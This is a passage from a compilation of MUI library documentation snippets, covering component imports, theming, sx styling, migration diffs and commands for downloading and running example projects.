      "@emotion",
      {
        importMap: {
          "@mui/system": {
            styled: {
              canonicalImport: ["@emotion/styled", "default"],
              styledBaseImport: ["@mui/system", "styled"]
            }
          },
          "@mui/material": {
            styled: {
              canonicalImport: ["@emotion/styled", "default"],
              styledBaseImport: ["@mui/material", "styled"]
            }
          },
          "@mui/material/styles": {
            styled: {
              canonicalImport: ["@emotion/styled", "default"],
              styledBaseImport: ["@mui/material/styles", "styled"]
            }
          }
        }
      }
    ]
  ]
};

----------------------------------------

TITLE: Using Component Prop with React Router Link in TypeScript
DESCRIPTION: Demonstrates how to use the component prop to integrate a Button component with React Router's Link component.

LANGUAGE: tsx
CODE:
import { Link } from 'react-router';
import Button from '@mui/material/Button';

function Demo() {
  return (
    <Button component={Link} to="/react-router">
      React router link
    </Button>
  );
}

----------------------------------------

TITLE: Installing MUI Base Next.js Example
DESCRIPTION: Commands to download and extract the MUI Base example project with Next.js and Tailwind CSS from the Material-UI repository.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/base-ui-nextjs-tailwind-ts
cd base-ui-nextjs-tailwind-ts

----------------------------------------

TITLE: Disabling CSS Color Scheme in Material UI
DESCRIPTION: Demonstrates how to disable the default CSS color-scheme property in Material UI by setting the disableCssColorScheme option to true in the createTheme function.

LANGUAGE: javascript
CODE:
createTheme({
  cssVariables: { disableCssColorScheme: true },
});

----------------------------------------

TITLE: Applying Background Colors in MUI Box Components
DESCRIPTION: Shows how to apply different background color variants from the MUI palette system using the Box component's sx prop with bgcolor property. Includes primary, secondary, error, warning, info, success, and text variants.

LANGUAGE: jsx
CODE:
<Box sx={{ bgcolor: 'primary.main' }}>…
<Box sx={{ bgcolor: 'secondary.main' }}>…
<Box sx={{ bgcolor: 'error.main' }}>…
<Box sx={{ bgcolor: 'warning.main' }}>…
<Box sx={{ bgcolor: 'info.main' }}>…
<Box sx={{ bgcolor: 'success.main' }}>…
<Box sx={{ bgcolor: 'text.primary' }}>…
<Box sx={{ bgcolor: 'text.secondary' }}>…
<Box sx={{ bgcolor: 'text.disabled' }}>…

----------------------------------------

TITLE: Multiple Arguments Spacing Usage
DESCRIPTION: Demonstrates how to use multiple arguments with theme.spacing() to reduce boilerplate code

LANGUAGE: javascript
CODE:
-padding: `${theme.spacing(1)} ${theme.spacing(2)}`, // '8px 16px'
+padding: theme.spacing(1, 2), // '8px 16px'

----------------------------------------

TITLE: Importing Popper Component in React
DESCRIPTION: Basic import statement for the Popper component from MUI Base.

LANGUAGE: jsx
CODE:
import { Popper } from '@mui/base/Popper';

----------------------------------------

TITLE: Downloading Joy UI Vite.js TypeScript Example
DESCRIPTION: Commands to download the example project from the Material-UI repository and navigate to the project directory.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/joy-ui-vite-ts
cd joy-ui-vite-ts

----------------------------------------

TITLE: Nested Typography Component Structure Example
DESCRIPTION: Demonstrates how Typography components automatically adjust their rendered HTML elements based on nesting. Parent Typography renders as a paragraph tag while nested Typography renders as a span tag for semantic correctness.

LANGUAGE: javascript
CODE:
<Typography> // the parent Typography renders as a <p>
  This is a very
    <Typography fontWeight="lg">important</Typography> // the child renders as a <span>
  message.
</Typography>

----------------------------------------

TITLE: Overriding Autocomplete Popper Slot in React
DESCRIPTION: This example demonstrates how to replace the popper slot in the Autocomplete component to remove the popup functionality using the slots prop.

LANGUAGE: jsx
CODE:
<Autocomplete slotProps={{ popper: { 'data-testid': 'my-popper' } }} />

----------------------------------------

TITLE: Disabling Ripple Effect Globally in MUI Theme
DESCRIPTION: This snippet shows how to disable the ripple effect globally for all MUI components by modifying the default props of the MuiButtonBase component in the theme.

LANGUAGE: javascript
CODE:
import { createTheme } from '@mui/material';

const theme = createTheme({
  components: {
    // Name of the component ⚛️
    MuiButtonBase: {
      defaultProps: {
        // The props to apply
        disableRipple: true, // No more ripple, on the whole application 💣!
      },
    },
  },
});

----------------------------------------

TITLE: Installing and Running Material UI Remix TypeScript Example
DESCRIPTION: Commands to install project dependencies and start the development server for the Material UI Remix TypeScript example.

LANGUAGE: bash
CODE:
npm install
npm run dev

----------------------------------------

TITLE: Running Pigment CSS Vite Demo App in Preview Mode
DESCRIPTION: This command uses pnpm and nx to run the Pigment CSS Vite demo app in preview mode after automatically building it.

LANGUAGE: bash
CODE:
pnpm nx run @app/pigment-css-vite-app:preview

----------------------------------------

TITLE: Downloading and Setting Up MUI Base Vite.js Example with Tailwind CSS
DESCRIPTION: These commands download the example project from the MUI GitHub repository, extract it, and change into the project directory.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/base-ui-vite-tailwind
cd base-ui-vite-tailwind

----------------------------------------

TITLE: Implementing Autocomplete with Portal in React
DESCRIPTION: Demonstrates how to use React Portals with MUI Base's Popper component to render the Autocomplete listbox outside the DOM hierarchy, allowing it to float above adjacent elements.

LANGUAGE: jsx
CODE:
import { useAutocomplete } from '@mui/base/useAutocomplete';
import { Popper } from '@mui/base/Popper';
import { unstable_useForkRef as useForkRef } from '@mui/utils';

export default function App(props) {
  const {
    getRootProps,
    getInputProps,
    getListboxProps,
    getOptionProps,
    popupOpen,
    anchorEl,
    setAnchorEl,
    groupedOptions,
  } = useAutocomplete(props);

  const rootRef = useForkRef(ref, setAnchorEl);

  return (
    <React.Fragment>
      <div {...getRootProps()} ref={rootRef}>
        <input {...getInputProps()} />
      </div>
      {anchorEl && (
        <Popper open={popupOpen} anchorEl={anchorEl}>
          {groupedOptions.length > 0 && (
            <ul {...getListboxProps()}>
              {groupedOptions.map((option, index) => (
                <li {...getOptionProps({ option, index })}>{option.label}</li>
              ))}
            </ul>
          )}
        </Popper>
      )}
    </React.Fragment>
  );
}

----------------------------------------

TITLE: Migrating dynamic styles in sx prop
DESCRIPTION: Example of migrating dynamic styles that depend on variables to use CSS variables with Pigment CSS.

LANGUAGE: javascript
CODE:
<div>
  {items.map((item, index) => (
    <Box
      key={index}
      sx={{
        borderRadius: '50%',
        width: `max(6px - var(--offset), 3px)`,
        height: `max(6px - var(--offset), 3px)`,
        bgcolor: index === 0 ? 'primary.solidBg' : 'background.level3',
      }}
      style={{
        '--offset': `${index}px`,
      }}
    />
  ))}
</div>

----------------------------------------

TITLE: Project Setup and Run Commands
DESCRIPTION: Sequential commands for installing dependencies, starting the development server, and building the project code. Includes an optional Vite optimization step for error prevention.

LANGUAGE: bash
CODE:
pnpm install

LANGUAGE: bash
CODE:
pnpm dev

LANGUAGE: bash
CODE:
pnpm build

LANGUAGE: bash
CODE:
pnpm vite optimize --force

----------------------------------------

TITLE: Running Pigment CSS Vite Demo App in Development Mode
DESCRIPTION: This command uses pnpm and nx to run the Pigment CSS Vite demo app in development mode for live editing and hot reloading.

LANGUAGE: bash
CODE:
pnpm nx run @app/pigment-css-vite-app:dev

----------------------------------------

TITLE: HTML Comment Block for Markdown Lint Configuration
DESCRIPTION: HTML comments that configure markdown linting behavior and document last modification date

LANGUAGE: html
CODE:
<!-- markdownlint-capture -->
<!-- markdownlint-disable -->

Last modified: October 7th, 2018.

<!-- markdownlint-restore -->

----------------------------------------

TITLE: Basic Autocomplete Usage in React
DESCRIPTION: Demonstrates the basic setup and usage of the Autocomplete component with a simple array of options.

LANGUAGE: jsx
CODE:
import Autocomplete from '@mui/joy/Autocomplete';
import Input from '@mui/joy/Input';

export default function App() {
  return <Autocomplete options={['Option 1', 'Option 2']} />;
}

----------------------------------------

TITLE: Setting HTML Direction Attribute
DESCRIPTION: Sets the RTL text direction at the HTML root level for global application

LANGUAGE: html
CODE:
<html dir="rtl"></html>

----------------------------------------

TITLE: Implementing Error Callout in MUI
DESCRIPTION: Shows how to create an error callout with formatted text, code, and links. This callout is used to convey critical warnings or potential failure points.

LANGUAGE: markup
CODE:
:::error
This is an error callout.
It says, "You will fail if you don't heed this dire warning."

- emphasised: **bold text**
- some code `<div/>`
- a [link](#link).
:::

----------------------------------------

TITLE: Creating custom button variants in MUI theme
DESCRIPTION: Example of adding a custom variant to the Button component using the theme

LANGUAGE: typescript
CODE:
import { createTheme, Button } from '@mui/material';

// 1. Extend the theme.
const theme = createTheme({
  components: {
    MuiButton: {
      variants: [
        {
          props: { variant: 'dashed', color: 'error' },
          style: {
            border: '1px dashed red',
            color: 'red',
          }
        }
      ]
    }
  }
});

// 2. Update the Button's color prop options
declare module '@mui/material/Button' {
  interface ButtonPropsVariantOverrides {
    dashed: true;
  }
}

// 3. Profit
<Button variant="dashed" color="error">
  dashed
</Button>

----------------------------------------

TITLE: Importing Badge Component in React
DESCRIPTION: This snippet shows how to import the Badge component from Joy UI. It's the basic setup required to use the Badge in a React application.

LANGUAGE: jsx
CODE:
import Badge from '@mui/joy/Badge';

----------------------------------------

TITLE: Importing AlertTitle Component in React
DESCRIPTION: Import statement for the AlertTitle component used to add titles to Alert components

LANGUAGE: jsx
CODE:
import AlertTitle from '@mui/material/AlertTitle';

----------------------------------------

TITLE: Downloading MUI Base TypeScript Example
DESCRIPTION: Commands to download and extract the MUI Base TypeScript example from the material-ui repository.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/base-ui-cra-ts
cd base-ui-cra-ts

----------------------------------------

TITLE: Box Component Width Usage Examples
DESCRIPTION: Examples showing different ways to specify width values using the Box component's sx prop, including fractions, pixels, and percentages.

LANGUAGE: jsx
CODE:
<Box sx={{ width: 1/4 }}> // Equivalent to width: '25%'
<Box sx={{ width: 300 }}> // Numbers are converted to pixel values.
<Box sx={{ width: '75%' }}> // String values are used as raw CSS.
<Box sx={{ width: 1 }}> // 100%

----------------------------------------

TITLE: Overriding Root Slot with Custom Element in React
DESCRIPTION: Demonstrates how to use the slots prop to override the default root element (span) with a div element in a Badge component.

LANGUAGE: jsx
CODE:
<Badge slots={{ root: 'div' }} />

----------------------------------------

TITLE: Making Badge Accessible with ARIA Label
DESCRIPTION: This example demonstrates how to make the Badge component accessible by providing a full description with the aria-label attribute. This is crucial for screen reader users to understand the Badge's content.

LANGUAGE: jsx
CODE:
<Badge badgeContent={4} aria-label="4 unread messages">
  <Mail />
</Badge>

----------------------------------------

TITLE: Configuring Emotion for RTL Support
DESCRIPTION: Setup for RTL support using Emotion's CacheProvider with stylis-plugin-rtl

LANGUAGE: jsx
CODE:
import { CacheProvider } from '@emotion/react';
import createCache from '@emotion/cache';
import { prefixer } from 'stylis';
import rtlPlugin from 'stylis-plugin-rtl';

// Create rtl cache
const rtlCache = createCache({
  key: 'muirtl',
  stylisPlugins: [prefixer, rtlPlugin],
});

function Rtl(props) {
  return <CacheProvider value={rtlCache}>{props.children}</CacheProvider>;
}

----------------------------------------

TITLE: Downloading and Setting Up Material UI Express SSR Example
DESCRIPTION: Commands to download the Material UI Express server-side rendering example from GitHub and navigate to the project directory.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-express-ssr
cd material-ui-express-ssr

----------------------------------------

TITLE: Setting Time Zone for TimePicker in React
DESCRIPTION: This snippet demonstrates how to set a specific time zone for a TimePicker component in MUI X. It uses the 'timezone' prop to display the time in the Pacific/Honolulu time zone.

LANGUAGE: TSX
CODE:
<TimePicker
  value={value}
  onChange={setValue}
  timezone="Pacific/Honolulu" // Can be in any timezone of your choice
  label={'Rendered in "Pacific/Honolulu"'}
/>

----------------------------------------

TITLE: Creating Theme Configuration with CSS Variables
DESCRIPTION: Defines a custom theme with light and dark color schemes using MUI's CSS variables system. Creates CSS variable names and theme object structure required for the CssVarsProvider.

LANGUAGE: javascript
CODE:
import {
  unstable_createGetCssVar as systemCreateGetCssVar,
  unstable_prepareCssVars as prepareCssVars,
} from '@mui/system';

const lightColorScheme = {
  palette: {
    mode: 'light',
    primary: {
      default: '#3990FF',
      dark: '#02367D',
    },
    text: {
      default: '#111111',
    },
    // ... other colors
  },
};

const darkColorScheme = {
  palette: {
    mode: 'dark',
    primary: {
      default: '#265D97',
      dark: '#132F4C',
      main: '#5090D3',
    },
    text: {
      default: '#ffffff',
    },
    // ... other colors
  },
};

const createGetCssVar = (cssVarPrefix = 'my-app') =>
  systemCreateGetCssVar(cssVarPrefix);

function extendTheme({ cssVarPrefix = 'my-app' } = {}) {
  const getCssVar = createGetCssVar(cssVarPrefix);
  const theme = {
    colorSchemes: {
      light: lightColorScheme,
      dark: darkColorScheme,
    },
  };

  const { vars: themeVars, generateCssVars } = prepareCssVars(
    { colorSchemes: theme.colorSchemes },
    {
      prefix: cssVarPrefix,
    },
  );
  theme.vars = themeVars;
  theme.generateCssVars = generateCssVars;
  theme.palette = {
    ...theme.colorSchemes.light.palette,
    colorScheme: 'light',
  };

  return theme;
}

const myCustomDefaultTheme = extendTheme();

export default myCustomDefaultTheme;

----------------------------------------

TITLE: MUI Font Style Control
DESCRIPTION: Examples of controlling font style using the Box component.

LANGUAGE: jsx
CODE:
<Box sx={{ fontStyle: 'normal' }}>…
<Box sx={{ fontStyle: 'italic' }}>…
<Box sx={{ fontStyle: 'oblique' }}>…

----------------------------------------

TITLE: Initializing Test Suite with MUI Test Renderer
DESCRIPTION: Example showing how to set up a test suite using @mui/internal-test-utils/createRenderer for unit testing React components.

LANGUAGE: javascript
CODE:
describe('test suite', () => {
  const { render } = createRenderer();

  test('first', () => {
    render(<input />);
  });
});

----------------------------------------

TITLE: Importing useAutocomplete Hook in React
DESCRIPTION: Shows how to import the useAutocomplete hook from MUI Base for use in a React component.

LANGUAGE: jsx
CODE:
import { useAutocomplete } from '@mui/base/useAutocomplete';

----------------------------------------

TITLE: Building Production Application
DESCRIPTION: Command to build the production version of the Pigment CSS Next.js demo application.

LANGUAGE: bash
CODE:
pnpm run --filter=@app/pigment-css-next-app build

----------------------------------------

TITLE: MUI System Sizing Import
DESCRIPTION: Import statement for accessing sizing utilities from MUI System.

LANGUAGE: javascript
CODE:
import { sizing } from '@mui/system';

----------------------------------------

TITLE: Setting Grid Row Properties
DESCRIPTION: Examples of setting grid row spans and start/end positions using MUI sx prop

LANGUAGE: jsx
CODE:
<Box sx={{ gridRow: '1 / 3' }}>…
<Box sx={{ gridRow: 'span 2' }}>…

----------------------------------------

TITLE: Updating createStyles import
DESCRIPTION: Change createStyles import from @mui/material/styles to @mui/styles.

LANGUAGE: diff
CODE:
-import { createStyles } from '@mui/material/styles';
+import { createStyles } from '@mui/styles';

----------------------------------------

TITLE: Updating createStyles import
DESCRIPTION: Change createStyles import from @mui/material/styles to @mui/styles.

LANGUAGE: diff
CODE:
-import { createStyles } from '@mui/material/styles';
+import { createStyles } from '@mui/styles';

----------------------------------------

TITLE: Custom Option Labeling in React Autocomplete
DESCRIPTION: Shows how to use the getOptionLabel prop to customize the display of options with a non-standard structure in the Autocomplete component.

LANGUAGE: js
CODE:
const options = [
  { issuer: 'Bank of America', brand: 'Visa', last4: '1234' },
  { issuer: 'Bank of America', brand: 'MasterCard', last4: '5678' },
  { issuer: 'Barclays', brand: 'Visa', last4: '4698' },
  // ...
];

const {
  getRootProps,
  // etc
} = useAutocomplete({
  getOptionLabel: (option) => option.last4,
});

----------------------------------------

TITLE: Enabling Experimental Aggregation Feature in MUI X Data Grid Premium
DESCRIPTION: This code snippet shows how to enable the experimental aggregation feature in the MUI X Data Grid Premium component using the experimentalFeatures prop.

LANGUAGE: tsx
CODE:
<DataGridPremium experimentalFeatures={{ aggregation: true }} {...otherProps} />

----------------------------------------

TITLE: Starting MUI Documentation Development Server
DESCRIPTION: Command to start the MUI documentation website in development mode using pnpm package manager. Must be run from the project root directory. Other package managers like npm or Yarn are not supported.

LANGUAGE: bash
CODE:
pnpm docs:dev

----------------------------------------

TITLE: Downloading and Setting Up the Project
DESCRIPTION: Commands to download the example project from the Material UI repository and navigate to the project directory.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/material-ui-cra-styled-components-ts
cd material-ui-cra-styled-components-ts

----------------------------------------

TITLE: Package Change Documentation
DESCRIPTION: Markdown sections documenting changes made to specific MUI packages and components

LANGUAGE: markdown
CODE:
### `@mui/material@7.0.0-beta.3`

- Fix moduleResolution:node for icons (#45444) @Janpot
- [ThemeProvider] Add `storageManager` prop to `ThemeProvider` (#45136) @siriwatknp
- [Radio] Fix `inputProps` not forwarded (#45471) @siriwatknp

----------------------------------------

TITLE: Installing and Running Joy UI Next.js Project
DESCRIPTION: Commands to install dependencies and start the development server for the Joy UI Next.js application.

LANGUAGE: bash
CODE:
npm install
npm run dev

----------------------------------------

TITLE: Rendering Gradient Background Demo Container in MUI Docs
DESCRIPTION: Shows how to set a gradient background for a demo container in MUI documentation.

LANGUAGE: markdown
CODE:
{"demo": "DemoInDocs.js", "bg": "gradient"}

----------------------------------------

TITLE: Running Browser Benchmark for Material-UI
DESCRIPTION: Command to execute the browser benchmark for Material-UI components and styling solutions. This command runs the benchmark scenarios defined in the project.

LANGUAGE: bash
CODE:
pnpm benchmark:browser

----------------------------------------

TITLE: Implementing Mode Switcher in Material UI
DESCRIPTION: Demonstrates how to implement a mode switcher component using the useColorScheme hook in Material UI. It includes a select element for switching between system, light, and dark modes.

LANGUAGE: jsx
CODE:
import { useColorScheme } from '@mui/material/styles';

function ModeSwitcher() {
  const { mode, setMode } = useColorScheme();

  if (!mode) {
    return null;
  }

  return (
    <select
      value={mode}
      onChange={(event) => {
        setMode(event.target.value);
        // For TypeScript, cast `event.target.value as 'light' | 'dark' | 'system'`:
      }}
    >
      <option value="system">System</option>
      <option value="light">Light</option>
      <option value="dark">Dark</option>
    </select>
  );
}

----------------------------------------

TITLE: Creating Version-Specific RefObject Type for React 19
DESCRIPTION: Defines a conditional RefObject type that adapts to different React versions based on useRef implementation.

LANGUAGE: typescript
CODE:
export type RefObject<T> = typeof React.useRef extends () => any
  ? React.MutableRefObject<T>
  : React.RefObject<T>;

----------------------------------------

TITLE: Circular Progress Component HTML Structure
DESCRIPTION: The base HTML structure of the Circular Progress component showing the root element, SVG, and circular elements

LANGUAGE: html
CODE:
<span role="progressbar" class="MuiCircularProgress-root">
  <svg class="MuiCircularProgress-svg">
    <circle class="MuiCircularProgress-track"></circle>
    <circle class="MuiCircularProgress-progress"></circle>
  </svg>
  <!-- children are nested here when present -->
</span>

----------------------------------------

TITLE: Horizontal Centering Example
DESCRIPTION: Demonstrates horizontal centering using margin auto values with the Box component.

LANGUAGE: jsx
CODE:
<Box sx={{ mx: 'auto', width: 200 }}>…

----------------------------------------

TITLE: Assembling a Custom Material UI Component
DESCRIPTION: Shows how to create a custom Stat component using the previously defined styled slots. This component can now accept theme customizations.

LANGUAGE: javascript
CODE:
// /path/to/Stat.js
import * as React from 'react';

const StatRoot = styled('div', {
  name: 'MuiStat',
  slot: 'root',
})(…);

const StatValue = styled('div', {
  name: 'MuiStat',
  slot: 'value',
})(…);

const StatUnit = styled('div', {
  name: 'MuiStat',
  slot: 'unit',
})(…);

const Stat = React.forwardRef(function Stat(props, ref) {
  const { value, unit, ...other } = props;

  return (
    <StatRoot ref={ref} {...other}>
      <StatValue>{value}</StatValue>
      <StatUnit>{unit}</StatUnit>
    </StatRoot>
  );
});

export default Stat;

----------------------------------------

TITLE: Configuring Error Message Handling for React 19 Compatibility
DESCRIPTION: Demonstrates conditional error message formatting based on React version using the reactMajor utility to maintain compatibility across React versions.

LANGUAGE: typescript
CODE:
const errorMessage1 = 'MUI X: Could not find the animation ref context.';
const errorMessage2 =
  'It looks like you rendered your component outside of a ChartsContainer parent component.';
const errorMessage3 =
  'The above error occurred in the <UseSkipAnimation> component:';
const expectedError =
  reactMajor < 19
    ? [errorMessage1, errorMessage2, errorMessage3]
    : `${errorMessage1}\n${errorMessage2}`;

----------------------------------------

TITLE: Installing Dependencies with npm
DESCRIPTION: Command to install MUI Base package in a React project.

LANGUAGE: bash
CODE:
npm install @mui/base

----------------------------------------

TITLE: Forwarding Refs in React Components
DESCRIPTION: Demonstrates how to properly forward refs in custom components to work with Material UI components that require access to DOM nodes.

LANGUAGE: jsx
CODE:
-const MyButton = () => <div role="button" />;
+const MyButton = React.forwardRef((props, ref) =>
+  <div role="button" {...props} ref={ref} />);

 <Button component={MyButton} />;

LANGUAGE: jsx
CODE:
-const SomeContent = props => <div {...props}>Hello, World!</div>;
+const SomeContent = React.forwardRef((props, ref) =>
+  <div {...props} ref={ref}>Hello, World!</div>);

 <Tooltip title="Hello again."><SomeContent /></Tooltip>;

----------------------------------------

TITLE: Renaming Color Manipulation Function
DESCRIPTION: Rename convertHexToRGB to hexToRgb when importing from @material-ui/core/styles.

LANGUAGE: diff
CODE:
-import { convertHexToRgb } from '@material-ui/core/styles/colorManipulator';
+import { hexToRgb } from '@material-ui/core/styles';

----------------------------------------

TITLE: Renaming Color Manipulation Function
DESCRIPTION: Rename convertHexToRGB to hexToRgb when importing from @material-ui/core/styles.

LANGUAGE: diff
CODE:
-import { convertHexToRgb } from '@material-ui/core/styles/colorManipulator';
+import { hexToRgb } from '@material-ui/core/styles';

----------------------------------------

TITLE: Styling with Emotion in React
DESCRIPTION: Example of using Emotion's styled API to create a styled div component

LANGUAGE: jsx
CODE:
const StyledDiv = styled('div')({
  color: 'red',
});

// or
const StyledDiv = styled.div`
  color: red;
`;

----------------------------------------

TITLE: Prop Shorthand Alternative
DESCRIPTION: Shows how to use full property names instead of shorthand notation for better clarity.

LANGUAGE: diff
CODE:
-<Box sx={{ pt: 2 }} />
+<Box sx={{ paddingTop: 2 }} />

-<Box sx={{ px: 2 }} />
+<Box sx={{ paddingX: 2 }} />

----------------------------------------

TITLE: Running MUI Docs Benchmarks
DESCRIPTION: Synthetic benchmark for the MarkdownElement component in the MUI documentation package.

LANGUAGE: bash
CODE:
pnpm server:docs

MarkdownElement x 3,941 ops/sec ±5.53% (185 runs sampled)

----------------------------------------

TITLE: Embedding a CodeSandbox iframe in HTML
DESCRIPTION: This HTML snippet shows how to embed a CodeSandbox example of a Material UI component within a webpage.

LANGUAGE: html
CODE:
<iframe src="https://codesandbox.io/embed/4j7m47vlm4" width="100%" height="300px" frameborder=0></iframe>

----------------------------------------

TITLE: TypeScript Module Augmentation for Table Props
DESCRIPTION: TypeScript type definition to add custom border axis values to the Table component

LANGUAGE: ts
CODE:
declare module '@mui/joy/Table' {
  interface TablePropsBorderAxisOverrides {
    header: true;
  }
}

----------------------------------------

TITLE: Creating DynamoDB Table for Feedback Storage
DESCRIPTION: This bash command creates a DynamoDB table named 'feedback-dev' with a string partition key 'id' and a sort key 'page'. It sets up the table with minimal provisioned throughput.

LANGUAGE: bash
CODE:
aws dynamodb create-table --profile claudia --region us-east-1 \
  --attribute-definitions AttributeName=id,AttributeType=S AttributeName=page,AttributeType=S \
  --key-schema AttributeName=id,KeyType=HASH AttributeName=page,KeyType=RANGE \
  --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=1 \
  --query TableDescription.TableArn --output text \
  --table-name feedback-dev

----------------------------------------

TITLE: Implementing Inline Display with MUI Box Component in JSX
DESCRIPTION: Demonstrates how to use the MUI Box component to create inline display elements. This snippet shows two div elements styled to display inline.

LANGUAGE: jsx
CODE:
<Box component="div" sx={{ display: 'inline' }}>inline</Box>
<Box component="div" sx={{ display: 'inline' }}>inline</Box>

----------------------------------------

TITLE: Importing Snackbar Component in React
DESCRIPTION: Basic import statement for the Snackbar component from Joy UI.

LANGUAGE: jsx
CODE:
import Snackbar from '@mui/joy/Snackbar';

----------------------------------------

TITLE: Installing and Running Material UI Next.js Project
DESCRIPTION: Commands to install project dependencies using npm and start the development server. After running these commands, the application will be available at http://localhost:3000.

LANGUAGE: bash
CODE:
npm install
npm run dev

----------------------------------------

TITLE: Implementing Responsive Element Hiding with MUI Box Component in JSX
DESCRIPTION: Demonstrates how to hide elements responsively using MUI Box component. This snippet shows two examples: hiding on screens wider than md breakpoint and hiding on screens smaller than md breakpoint.

LANGUAGE: jsx
CODE:
<Box sx={{ display: { xs: 'block', md: 'none' } }}>
  hide on screens wider than md
</Box>
<Box sx={{ display: { xs: 'none', md: 'block' } }}>
  hide on screens smaller than md
</Box>

----------------------------------------

TITLE: Managing White Space with MUI Box Component in JSX
DESCRIPTION: Shows how to handle white space using MUI Box component, demonstrating both nowrap and normal white space handling.

LANGUAGE: jsx
CODE:
<Box component="div" sx={{ whiteSpace: 'nowrap' }}>
  Lorem Ipsum has been the industry's standard dummy text ever since the 1500s.
</Box>
<Box component="div" sx={{ whiteSpace: 'normal' }}>
  Lorem Ipsum has been the industry's standard dummy text ever since the 1500s.
</Box>

----------------------------------------

TITLE: MUI Base Peer Dependencies
DESCRIPTION: JSON configuration showing React and ReactDOM peer dependency requirements for MUI Base

LANGUAGE: json
CODE:
"peerDependencies": {
  "react": "^17.0.0 || ^18.0.0 || ^19.0.0",
  "react-dom": "^17.0.0 || ^18.0.0 || ^19.0.0"
}

----------------------------------------

TITLE: Installing Material UI dependencies for Next.js Pages Router
DESCRIPTION: Commands for installing necessary dependencies to use Material UI with Next.js Pages Router.

LANGUAGE: bash
CODE:
npm install @mui/material-nextjs @emotion/cache @emotion/server

LANGUAGE: bash
CODE:
pnpm add @mui/material-nextjs @emotion/cache @emotion/server

LANGUAGE: bash
CODE:
yarn add @mui/material-nextjs @emotion/cache @emotion/server

----------------------------------------

TITLE: Installing Material UI Next.js Project
DESCRIPTION: Commands to download and extract the Material UI Next.js Pages Router example from GitHub repository.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-nextjs-pages-router
cd material-ui-nextjs-pages-router

----------------------------------------

TITLE: Installing and Running Material UI CRA TypeScript Example
DESCRIPTION: Commands to install dependencies and start the development server for the Material UI Create React App TypeScript example.

LANGUAGE: bash
CODE:
npm install
npm start

----------------------------------------

TITLE: Downloading Joy UI Next.js TypeScript Example
DESCRIPTION: Commands to download and extract the Joy UI Next.js TypeScript example project from the Material-UI repository.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/joy-ui-nextjs-ts
cd joy-ui-nextjs-ts

----------------------------------------

TITLE: Installing Dependencies and Running Joy UI CRA TypeScript Project
DESCRIPTION: This snippet demonstrates how to install the project dependencies and start the development server for the Joy UI Create React App TypeScript example.

LANGUAGE: bash
CODE:
npm install
npm start

----------------------------------------

TITLE: Running MUI Codemod Migration Script
DESCRIPTION: Command to run the MUI codemod tool that automatically migrates Date Picker imports from @mui/lab to the new X packages across an entire codebase.

LANGUAGE: bash
CODE:
npx @mui/codemod@latest v5.0.0/date-pickers-moved-to-x <path>

----------------------------------------

TITLE: Implementing Responsive Grid Spacing in React with MUI
DESCRIPTION: This snippet demonstrates how to use the new responsive spacing feature of the Grid component in MUI v5. It allows setting different spacing values for different breakpoints.

LANGUAGE: jsx
CODE:
<Grid container spacing={{ xs: 2, md: 3 }} />

----------------------------------------

TITLE: Support Key Validator Implementation in TypeScript
DESCRIPTION: The updateMuiPaidSupport.ts file implements functions for validating MUI X Premium customer support keys using GitHub Actions, Google Sheets, and Octokit. It handles user information verification and data binding to UI components.

LANGUAGE: typescript
CODE:
// Referenced file: updateMuiPaidSupport.ts
// Note: Actual code implementation is not shown in the source text

----------------------------------------

TITLE: Installing MUI Base via yarn
DESCRIPTION: Command to install the MUI Base package using yarn package manager.

LANGUAGE: bash
CODE:
yarn add @mui/base

----------------------------------------

TITLE: TypeScript Interface Extension for MUI Button
DESCRIPTION: Shows how to extend MUI component interfaces using TypeScript module augmentation to add custom variants that will be type-safe in the ownerState object.

LANGUAGE: ts
CODE:
declare module '@mui/material/Button' {
  interface ButtonPropsVariantOverrides {
    dashed: true;
  }
}

----------------------------------------

TITLE: Running Pigment CSS Next.js Demo App in Development Mode
DESCRIPTION: This command uses pnpm and nx to run the Pigment CSS Next.js demo app in development mode for live editing and hot reloading.

LANGUAGE: bash
CODE:
pnpm nx run @app/pigment-css-next-app:dev

----------------------------------------

TITLE: Watching Pigment CSS Package Changes
DESCRIPTION: Command to watch and rebuild Pigment CSS package files during development.

LANGUAGE: bash
CODE:
pnpm watch:zero

----------------------------------------

TITLE: Slot Props Resolver Implementation
DESCRIPTION: Demonstrates the implementation of a slot props resolver function that properly merges built-in props with external props and handlers.

LANGUAGE: typescript
CODE:
const getRootProps = <OtherHandlers extends EventHandlers>(
  otherHandlers: OtherHandlers = {} as OtherHandlers,
): UseAwesomeControlRootSlotProps<OtherHandlers> => {
  return {
    id,
    disabled,
    role: 'button' as const,
    ...otherHandlers,
    ref: handleListboxRef,
    onMouseDown: createHandleMouseDown(otherHandlers),
  };
};

----------------------------------------

TITLE: Creating and Pushing a New Topic Branch
DESCRIPTION: Commands to create a new topic branch and push changes to the fork.

LANGUAGE: bash
CODE:
git checkout -b my-topic-branch
git push -u origin HEAD

----------------------------------------

TITLE: Testing API: Creating New Feedback
DESCRIPTION: This curl command demonstrates how to create a new feedback entry by sending a POST request to the API endpoint. It uses data stored in the 'example.json' file.

LANGUAGE: bash
CODE:
curl -H "Content-Type: application/json" -X POST --data @example.json <API-URL>/feedback

----------------------------------------

TITLE: Styling Components with Styled-Components API
DESCRIPTION: Example showing how to style components using the styled-components API with theme-based styling.

LANGUAGE: jsx
CODE:
const StatWrapper = styled('div')(
  ({ theme }) => `
  background-color: ${theme.palette.background.paper};
  box-shadow: ${theme.shadows[1]};
  border-radius: ${theme.shape.borderRadius}px;
  padding: ${theme.spacing(2)};
  min-width: 300px;
`,
);

const StatHeader = styled('div')(
